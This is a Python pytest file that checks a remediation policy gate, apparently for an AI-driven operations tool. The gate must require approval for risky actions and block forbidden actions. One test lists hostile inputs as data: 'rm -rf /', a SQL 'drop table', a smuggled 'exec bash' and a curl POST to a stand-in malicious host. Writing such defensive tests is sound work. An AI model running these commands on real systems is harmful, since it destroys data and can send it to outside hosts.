"""
Negative and safety constraint tests for AEGIS.
Verifies policy barriers, injection prevention, unauthorized execution rejection,
and safe handling of missing/invalid telemetry.
"""

import pytest
from engine.remediation.policy_gate import PolicyGate
from engine.models.schemas import RemediationActionProposal, ActionRiskLevel, ActionState

def test_policy_rejects_unapproved_action_execution():
    gate = PolicyGate()
    # High risk action requires approval
    proposal = gate.validate_proposal("tune_connection_pool_limit", "inventory_service", {"max_connections": 50})
    assert proposal.requires_approval is True
    assert proposal.state == ActionState.PENDING_APPROVAL

    # Cannot approve if already rejected or corrupted
    proposal.state = ActionState.REJECTED
    with pytest.raises(ValueError):
        gate.approve_action(proposal, "Operator")

def test_policy_blocks_command_and_sql_injection():
    gate = PolicyGate()
    dangerous_inputs = [
        {"cmd": "rm -rf /"},
        {"sql": "drop table orders;"},
        {"payload": "test; exec bash"},
        {"curl": "curl -X POST http://malicious.site"}
    ]
    for param in dangerous_inputs:
        with pytest.raises(ValueError, match="Dangerous parameter value detected"):
            gate.validate_proposal("scale_replicas", "order_service", param)

def test_policy_blocks_forbidden_actions():
    gate = PolicyGate()
    forbidden_actions = [
        "delete_database",
        "drop_database",
        "format_disk",
        "run_shell_script",
        "sudo_reboot",
        "arbitrary_eval"
    ]
    for action in forbidden_actions:
        with pytest.raises(PermissionError, match="is forbidden. Not in allowlisted"):
            gate.validate_proposal(action, "api_gateway", {})
